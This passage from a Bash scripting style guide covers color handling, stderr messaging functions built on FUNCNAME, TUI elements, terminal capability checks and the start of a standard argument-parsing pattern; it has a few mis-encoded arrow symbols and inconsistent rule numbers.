  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Rationale**: Terminal detection (`[[ -t 1 && -t 2 ]]`) prevents ANSI escape sequences in pipes/redirects. Testing both file descriptors ensures messages (stderr) and output (stdout) are both terminal-bound. Empty strings for non-terminals enable uniform code - `echo "${RED}Error${NC}"` works correctly whether colors are enabled or not.

**Standard color palette**: `RED` (errors), `GREEN` (success), `YELLOW` (warnings), `CYAN` (info), `NC` (reset). All declared readonly after initialization.

**Flags**: `VERBOSE` controls verbosity, `PROMPT` enables user prompts, `DEBUG` enables debug output. Declare as integers (`declare -i`) for boolean testing with `(( ))`.


---


**Rule: BCS0702**

## STDOUT vs STDERR

**Rule**: All error messages must go to STDERR. Place `>&2` at the beginning of commands for clarity.

```bash
# Preferred format
somefunc() {
  >&2 echo "[$(date -Ins)]: $*"
}

# Also acceptable
somefunc() {
  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
}
```

**Rationale**: Beginning placement improves readability by immediately signaling the redirection intent.


---


**Rule: BCS0703**

## Core Message Functions

**Every script should implement standard messaging functions using a private `_msg()` core function that inspects `FUNCNAME[1]` to automatically format messages based on the calling function.**

**Rationale:**

- **Consistency**: Same message format across all scripts
- **DRY**: Single `_msg()` implementation reused by all messaging functions
- **Proper Streams**: Errors/warnings to stderr, data to stdout
- **Context**: `FUNCNAME` inspection auto-adds prefix/color
- **Verbosity Control**: Conditional functions respect `VERBOSE` flag
- **User Experience**: Colors and symbols make output scannable

### FUNCNAME Inspection

**The FUNCNAME array** contains the function call stack:
- `${FUNCNAME[0]}` = Current function (`_msg`)
- `${FUNCNAME[1]}` = Calling function (`info`, `warn`, `error`, etc.)

**Why powerful:** Inspecting `FUNCNAME[1]` automatically detects caller, enabling single `_msg()` to format differently per caller without passing parameters.

**Call stack example:**
```bash
main() { process_file "test.txt"; }

process_file() {
  info "Processing $1"
  # When info() calls _msg():
  #   FUNCNAME[0] = "_msg"     (current)
  #   FUNCNAME[1] = "info"     (caller - determines formatting!)
  #   FUNCNAME[2] = "process_file"
}
```

**Implementation:**

```bash
# Private core messaging function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    vecho)   ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}
```

**Public wrappers:**

```bash
# Conditional (respect VERBOSE)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug (respects DEBUG)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional
error()   { >&2 _msg "$@"; }

# Error and exit
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}
```

**Usage:**

```bash
info 'Starting processing...'
success 'Build completed'
warn 'Config not found, using defaults'
error 'Failed to connect'
debug "Variable state: count=$count"
die 1 'Critical error'
die 22 "File not found: $file"
```

**Stdout vs stderr:**

```bash
# info/warn/error → stderr (>&2)
data=$(./script.sh)              # Gets only data
./script.sh 2>errors.log         # Errors to file
./script.sh | process_data       # Messages visible, data piped
```

**Color definitions:**

```bash
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'
else
  RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC
```

**Flags:**

```bash
declare -i VERBOSE=0  # 1 for info/warn/success
declare -i DEBUG=0    # 1 for debug
declare -i PROMPT=1   # 0 for non-interactive
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0 DEBUG=0 PROMPT=1

if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'; GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'; CYAN=$'\033[0;36m'; NC=$'\033[0m'
else
  RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC

# Messaging Functions
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die()     { local -i exit_code=${1:-1}; shift; (($#)) && error "$@"; exit "$exit_code"; }

yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -d|--debug)   DEBUG=1 ;;
    -y|--yes)     PROMPT=0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done
  readonly -- VERBOSE DEBUG PROMPT

  info "Starting $SCRIPT_NAME $VERSION"
  info 'Processing files...'
  success 'Files processed'
  if yn 'Continue?'; then
    info 'Deploying...'
    success 'Complete'
  else
    warn 'Skipped'
  fi
}

main "$@"
#fin
```

**Simplified version (no colors):**

```bash
_msg() {
  local -- level="${FUNCNAME[1]}"
  printf '[%s] %s: %s\n' "$SCRIPT_NAME" "${level^^}" "$*"
}
info()  { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die()   { local -i code=$1; shift; (($#)) && error "$@"; exit "$code"; }
```

**Log to file variant:**

```bash
LOG_FILE="/var/log/$SCRIPT_NAME.log"

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
```

**Anti-patterns:**

```bash
# ✗ Wrong - echo directly (not stderr, no prefix, no color, ignores VERBOSE)
echo "Error: file not found"
# ✓ Correct
error 'File not found'

# ✗ Wrong - duplicating logic
info() { echo "[$SCRIPT_NAME] INFO: $*"; }
warn() { echo "[$SCRIPT_NAME] WARN: $*"; }
# ✓ Correct - use _msg with FUNCNAME
_msg() {
  local -- prefix="$SCRIPT_NAME:"
  case "${FUNCNAME[1]}" in
    info)  prefix+=" INFO:" ;;
    warn)  prefix+=" WARN:" ;;
  esac
  echo "$prefix $*"
}
info() { _msg "$@"; }
warn() { _msg "$@"; }

# ✗ Wrong - errors to stdout
error() { echo "[ERROR] $*"; }
# ✓ Correct - errors to stderr
error() { >&2 _msg "$@"; }

# ✗ Wrong - ignores VERBOSE
info() { >&2 _msg "$@"; }
# ✓ Correct
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ✗ Wrong - no exit code parameter
die() { error "$@"; exit 1; }
# ✓ Correct
die() { local -i exit_code=${1:-1}; shift; (($#)) && error "$@"; exit "$exit_code"; }

# ✗ Wrong - yn() ignores PROMPT
yn() {
  local reply
  read -r -n 1 -p "$1 y/n " reply
  [[ ${reply,,} == y ]]
}
# ✓ Correct - respects PROMPT
yn() {
  ((PROMPT)) || return 0
  local reply
  >&2 read -r -n 1 -p "$SCRIPT_NAME: $1 y/n " reply
  >&2 echo
  [[ ${reply,,} == y ]]
}
```

**Function variants:**

**Minimal (no colors/flags):**
```bash
info()  { >&2 echo "[$SCRIPT_NAME] $*"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { error "$*"; exit "${1:-1}"; }
```

**Medium (VERBOSE, no colors):**
```bash
declare -i VERBOSE=0
info()  { ((VERBOSE)) && >&2 echo "[$SCRIPT_NAME] $*"; return 0; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { local -i code=$1; shift; (($#)) && error "$@"; exit "$code"; }
```

**Summary:** Use `_msg()` with FUNCNAME inspection for DRY. Conditional functions respect `VERBOSE`, unconditional always display. Errors to stderr (`>&2`). Colors conditional on terminal. `die()` takes exit code first. `yn()` respects PROMPT. Remove unused functions per Section 6.


---


**Rule: BCS0704**

## Usage Documentation

```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
```


---


**Rule: BCS0705**

## Echo vs Messaging Functions

**Choose between plain `echo` and messaging functions based on context and output destination. Use messaging functions for operational status (stderr), and plain `echo` for data output (stdout).**

**Rationale:**
- **Stream Separation**: Messaging �' stderr (user-facing); `echo` �' stdout (data/parseable)
- **Verbosity Control**: Messaging functions respect `VERBOSE`; `echo` always displays
- **Script Composition**: Proper streams allow pipelines without mixing data and status
- **Parseability**: Plain `echo` output is predictable; messaging includes formatting

**Use messaging functions (`info`, `success`, `warn`, `error`) for:**

1. **Operational status updates:**
```bash
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'
```

2. **User-facing diagnostics:**
```bash
debug "Variable state: count=$count, total=$total"
info "Using configuration file: $config_file"
```

3. **Messages respecting verbosity:**
```bash
info 'Checking prerequisites...'   # Only shown if VERBOSE=1
error 'Configuration file not found'  # Always shown
```

**Use plain `echo` for:**

1. **Data output (stdout):**
```bash
get_user_email() {
  local -- username="$1"
  local -- email
  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)
  echo "$email"  # Data output - must use echo
}
user_email=$(get_user_email 'alice')  # Can capture output
```

2. **Help text and documentation:**
```bash
usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...

Options:
  -v, --verbose     Enable verbose output
  -h, --help        Show this help message
EOF
}
```

3. **Output for parsing or piping:**
```bash
list_users() {
  local -- user
  while IFS=: read -r user _; do
    echo "$user"
  done < /etc/passwd
}
list_users | grep '^admin' | wc -l
```

4. **Output that must always display:**
```bash
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}
echo "Processed $success_count files successfully"
```

**Decision matrix:**
```bash
# Is this operational status or data?
#   Status �' messaging function    |   Data �' echo
# Should this respect verbosity?
#   Yes �' messaging function       |   No �' echo
# Will this be parsed or piped?
#   Yes �' echo to stdout           |   No �' messaging to stderr
# Does this need color/formatting?
#   Yes �' messaging function       |   No �' echo
```

**Core implementation pattern:**

```bash
# Messaging Functions (stderr, with verbosity control)
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }

# Data Functions (stdout, always output)
get_user_home() {
  local -- username="$1"
  local -- home_dir
  home_dir=$(getent passwd "$username" | cut -d: -f6)
  [[ -z "$home_dir" ]] && return 1
  echo "$home_dir"  # Data to stdout
}
```

**Running behavior:**
```bash
# Without verbose - only data output and errors
$ ./script.sh alice
User Report
===========
Username: alice
...

# With verbose - operational messages visible (to stderr)
$ ./script.sh -v alice
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
User Report
===========
...

# Pipe output (only stdout piped, stderr messages visible)
$ ./script.sh -v alice | grep Shell
script.sh: ◉ Looking up user: alice
Shell: /bin/bash
script.sh: ◉ Report generation complete
```

**Anti-patterns:**

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email 'alice')  # $email is empty!

# ✓ Correct - use echo for data output
get_user_email() {
  echo "$email"  # Goes to stdout, can be captured
}

# ✗ Wrong - using echo for operational status
process_file() {
  echo "Processing $file..."  # Goes to stdout - mixes with data!
  cat "$file"
}

# ✓ Correct - use messaging function for status
process_file() {
  info "Processing $file..."  # Goes to stderr - separated from data
  cat "$file"                  # Data to stdout
}

# ✗ Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'  # Won't display if VERBOSE=0!
}

# ✓ Correct - help text using echo/cat
show_help() {
  cat <<'EOF'
Usage: script.sh [OPTIONS]
EOF
}

# ✗ Wrong - error messages to stdout
validate_input() {
  if [[ ! -f "$1" ]]; then
    echo "File not found: $1"  # To stdout - wrong stream!
    return 1
  fi
}

# ✓ Correct - error messages to stderr
validate_input() {
  if [[ ! -f "$1" ]]; then
    error "File not found: $1"  # To stderr - correct stream
    return 1
  fi
}
```

**Edge cases:**

**1. Version output (always echo):**
```bash
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo - version won't show if VERBOSE=0 with info()
}
```

**2. Progress during data generation:**
```bash
generate_data() {
  info 'Generating data...'              # Progress to stderr
  for ((i=1; i<=100; i+=1)); do
    echo "line $i"                        # Data to stdout
  done
  success 'Data generation complete'     # Completion to stderr
}
data=$(generate_data)  # Captures data, sees progress
```

**3. Conditional output formatting:**
```bash
show_result() {
  if [[ -t 1 ]]; then
    success 'Operation completed'  # Interactive terminal
  else
    echo "$result"                 # Non-interactive/piped
  fi
}
```

**4. Logging vs user messages:**
```bash
process_item() {
  local -- item="$1"
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"  # Log (stdout�'file)
  info "Processing $item..."                                # User message (stderr)
}
process_item "$item" >> "$log_file"
```

**Key principle:** The choice between echo and messaging functions is fundamentally about stream separation. Operational messages (how the script is working) belong on stderr via messaging functions. Data output (what the script produces) belongs on stdout via echo. This enables proper script composition, piping, and redirection.


---


**Rule: BCS0706**

## Color Management Library

For scripts requiring sophisticated color management beyond inline declarations (BCS0901), use a dedicated color management library providing two-tier system, automatic terminal detection, and _msg system integration (BCS0903).

**Rationale:**

- **Namespace Control**: Two-tier system (basic 5 vars vs complete 12 vars) prevents global namespace pollution
- **Flexibility**: Auto-detection, force-on, or force-off modes for different deployment scenarios
- **_msg Integration**: `flags` option sets BCS control variables (VERBOSE, DEBUG, DRY_RUN, PROMPT)
- **Reusability**: Dual-purpose pattern (BCS010201) - sourceable library or standalone executable
- **Maintainability**: Centralized color definitions vs scattered inline declarations
- **Testing**: Built-in verbose mode for debugging color variable states

**Two-Tier Color System:**

**Basic tier (5 variables)** - Default:
```bash
NC RED GREEN YELLOW CYAN
```

**Complete tier (12 variables)** - Opt-in:
```bash
# Basic tier plus:
BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
```

**Library Function Signature:**

```bash
color_set [OPTIONS...]
```

**Options (combinable):**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (checks stdout AND stderr) (default) |
| `always` | Force colors on (even when piped/redirected) |
| `never`, `none` | Force colors off |
| `verbose`, `-v`, `--verbose` | Print all variable declarations |
| `flags` | Set BCS _msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |
| `--help`, `-h`, `help` | Display usage (executable mode only) |

**BCS _msg System Integration:**

The `flags` option initializes BCS control variables for core message functions (BCS0903):

```bash
source color-set.sh
color_set complete flags

# Sets: VERBOSE=1 (or preserved), DEBUG=0, DRY_RUN=1, PROMPT=1
```

One-line initialization of colors and messaging:
```bash
#!/bin/bash
source /usr/local/lib/color-set.sh
color_set complete flags

info "Starting process"
success "Operation completed"
```

**Implementation Example:**

```bash
#!/bin/bash
# color-set.sh - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose) verbose=1 ;;
      always)   color=1 ;;
      never|none) color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid option ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Set BCS control flags if requested
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -g NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: early return when sourced
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<'HELP'
Usage: color-set.sh [OPTIONS...]

Dual-purpose bash library for terminal color management.

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]
  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]
  verbose, -v       Print variable declarations
  flags             Set BCS globals (VERBOSE, DEBUG, DRY_RUN, PROMPT)
  --help, -h        Display this help

EXAMPLES:
  ./color-set.sh complete verbose
  source color-set.sh && color_set complete flags
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

**Basic usage:**
```bash
#!/bin/bash
source color-set.sh
color_set basic

echo "${RED}Error:${NC} Operation failed"
echo "${GREEN}Success:${NC} Operation completed"
```

**Complete tier with attributes:**
```bash
source color-set.sh
color_set complete

echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"
```

**Force colors for piped output:**
```bash
source color-set.sh
color_set complete always

./script.sh | less -R  # Colors preserved
```

**Disable colors for logging:**
```bash
source color-set.sh
color_set never

exec > /var/log/script.log 2>&1  # No ANSI codes
```

**Integrated with BCS _msg system:**
```bash
source color-set.sh
color_set complete flags

info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"       # Uses GREEN
error "Connection failed"       # Uses RED
debug "State: x=$x"            # Uses YELLOW, respects DEBUG
```

**Testing color variables:**
```bash
# Show all variables
source color-set.sh
color_set complete verbose

# Test piped output (should disable colors)
./color-set.sh auto verbose | cat
```

**Anti-patterns:**

L **Scattered inline color declarations:**
```bash
# DON'T: Duplicate declarations across scripts
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
```

L **Always loading complete tier:**
```bash
# DON'T: Pollute namespace unnecessarily
color_set complete  # When only using basic colors
```

L **Testing only stdout:**
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1  # Fails when stderr redirected
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1
```

**Reference Implementation:**

`/usr/local/lib/color-set.sh` or https://github.com/Open-Technology-Foundation/bash-libs/color-set

**Cross-References:**

- **BCS0901** - Basic inline color pattern
- **BCS0903** - Core message functions using colors and control flags
- **BCS010201** - Dual-purpose pattern

**Ref:** BCS0906


---


**Rule: BCS0707**

## TUI Basics

**Rule: BCS0907**

Creating text-based user interface elements in terminal scripts.

---

#### Rationale

TUI elements provide visual feedback for long-running operations, interactive prompts/menus, progress indication, and better UX.

---

#### Progress Indicators

```bash
# Simple spinner
spinner() {
  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while :; do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1
    sleep 0.1
  done
}

# Start spinner in background
spinner 'Processing...' &
spinner_pid=$!

# Do work...
long_operation

# Stop spinner
kill "$spinner_pid" 2>/dev/null
printf '\r\033[K'  # Clear line
```

#### Progress Bar

```bash
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -i empty=$((width - filled))
  local -- bar

  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$empty" '' | tr ' ' '░')

  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Usage
declare -i i
for ((i=1; i<=100; i+=1)); do
  progress_bar "$i" 100
  sleep 0.05
done
echo
```

#### Cursor Control

```bash
# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT

# Move cursor
move_up() { printf '\033[%dA' "${1:-1}"; }
move_down() { printf '\033[%dB' "${1:-1}"; }
move_to() { printf '\033[%d;%dH' "$1" "$2"; }

# Clear operations
clear_line() { printf '\033[2K\r'; }
clear_screen() { printf '\033[2J\033[H'; }
clear_to_end() { printf '\033[J'; }
```

#### Interactive Menu

```bash
select_option() {
  local -a options=("$@")
  local -i selected=0
  local -- key

  hide_cursor
  trap 'show_cursor' RETURN

  while :; do
    # Display menu
    local -i i
    for ((i=0; i<${#options[@]}; i+=1)); do
      if ((i == selected)); then
        printf '  \033[7m %s \033[0m\n' "${options[i]}"
      else
        printf '   %s\n' "${options[i]}"
      fi
    done

    # Read keypress
    IFS= read -rsn1 key
    case "$key" in
      $'\x1b')  # Escape sequence
        read -rsn2 key
        case "$key" in
          '[A') ((selected > 0)) && ((selected-=1)) ;;  # Up
          '[B') ((selected < ${#options[@]}-1)) && ((selected+=1)) ;;  # Down
        esac
        ;;
      '') break ;;  # Enter
    esac

    # Move cursor back up
    printf '\033[%dA' "${#options[@]}"
  done

  show_cursor
  return "$selected"
}

# Usage
select_option "Option 1" "Option 2" "Option 3"
selected=$?
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not a terminal

# ✓ Correct - check for terminal
if [[ -t 1 ]]; then
  progress_bar 50 100
else
  echo "50% complete"
fi
```

---

**See Also:** BCS0908 (Terminal Capabilities), BCS0701 (Color Support)

#fin


---


**Rule: BCS0708**

## Terminal Capabilities

**Rule: BCS0908**

Detecting and utilizing terminal features safely to ensure scripts work across all environments with graceful fallbacks.

---

#### Rationale

Terminal capability detection ensures scripts work in all environments (terminals, pipes, redirects) by providing graceful fallbacks for limited terminals while enabling rich output when available.

---

#### Terminal Detection

```bash
# Check if stdout is a terminal
if [[ -t 1 ]]; then
  # Terminal - can use colors, cursor control
  USE_COLORS=1
else
  # Pipe or redirect - plain output only
  USE_COLORS=0
fi

# Check both stdout and stderr
if [[ -t 1 && -t 2 ]]; then
  declare -- RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -- RED='' NC=''
fi
```

#### Terminal Size

```bash
# Get terminal dimensions
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80
    TERM_ROWS=24
  fi
}

# Auto-update on resize
trap 'get_terminal_size' WINCH
get_terminal_size
```

#### Capability Checking

```bash
# Check for specific capability
has_capability() {
  local -- cap=$1
  tput "$cap" &>/dev/null
}

# Use with fallback
if has_capability colors; then
  num_colors=$(tput colors)
  ((num_colors >= 256)) && USE_256_COLORS=1
fi

# Check for Unicode support
has_unicode() {
  [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]
}
```

#### Safe Output Functions

```bash
# Width-aware output
print_line() {
  local -i width=${TERM_COLS:-80}
  printf '%*s\n' "$width" '' | tr ' ' '─'
}

# Truncate to terminal width
truncate_string() {
  local -- str=$1
  local -i max=${2:-$TERM_COLS}

  if ((${#str} > max)); then
    echo "${str:0:$((max-3))}..."
  else
    echo "$str"
  fi
}

# Center text
center_text() {
  local -- text=$1
  local -i width=${TERM_COLS:-80}
  local -i padding=$(((width - ${#text}) / 2))

  printf '%*s%s\n' "$padding" '' "$text"
}
```

#### ANSI Code Reference

```bash
# Common ANSI escape codes
declare -r ESC=$'\033'

# Colors (foreground)
declare -r BLACK="${ESC}[30m"  RED="${ESC}[31m"
declare -r GREEN="${ESC}[32m"  YELLOW="${ESC}[33m"
declare -r BLUE="${ESC}[34m"   MAGENTA="${ESC}[35m"
declare -r CYAN="${ESC}[36m"   WHITE="${ESC}[37m"

# Styles
declare -r BOLD="${ESC}[1m"    DIM="${ESC}[2m"
declare -r ITALIC="${ESC}[3m"  UNDERLINE="${ESC}[4m"
declare -r BLINK="${ESC}[5m"   REVERSE="${ESC}[7m"

# Reset
declare -r NC="${ESC}[0m"

# Cursor
declare -r HIDE_CURSOR="${ESC}[?25l"
declare -r SHOW_CURSOR="${ESC}[?25h"
declare -r SAVE_CURSOR="${ESC}7"
declare -r RESTORE_CURSOR="${ESC}8"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - assuming terminal support
echo -e '\033[31mError\033[0m'  # May output garbage in pipes

# ✓ Correct - conditional output
if [[ -t 1 ]]; then
  echo -e '\033[31mError\033[0m'
else
  echo 'Error'
fi

# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"  # May wrap or truncate wrong

# ✓ Correct - use terminal width
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

---

**See Also:** BCS0907 (TUI Basics), BCS0906 (Color Management)

#fin


---


**Rule: BCS0800**

# Command-Line Arguments

This section establishes the standard argument parsing pattern supporting both short options (`-h`, `-v`) and long options (`--help`, `--version`), ensuring consistent command-line interfaces. It defines canonical version output format (`scriptname X.Y.Z`), validation patterns for required arguments and option conflicts, and guidance on argument parsing placement (main function vs top-level) based on script complexity. These patterns ensure scripts are predictable, user-friendly, and maintainable for both interactive and automated usage.


---


**Rule: BCS0801**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth="$1" ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;

  -q|--quiet)     VERBOSE=0 ;;
  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;

  -h|--help)      show_help; exit 0 ;;
  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option '$1'" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern components:**

**Loop structure:** `while (($#)); do ... done` - Arithmetic test `(($#))` is more efficient than `[[ $# -gt 0 ]]`, exits when no arguments remain.

**Options with arguments:**
```bash
-m|--depth)     noarg "$@"; shift
                max_depth="$1" ;;
```
- `noarg "$@"` validates argument exists
- First `shift` moves to value, second shift (loop end) moves past it

**Flag options:**
```bash
-v|--verbose)   VERBOSE+=1 ;;
```
- No shift needed (handled at loop end)
- `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`

**Exit options:**
```bash
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
```
- Print and exit, no shift needed

**Short option bundling:**
```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
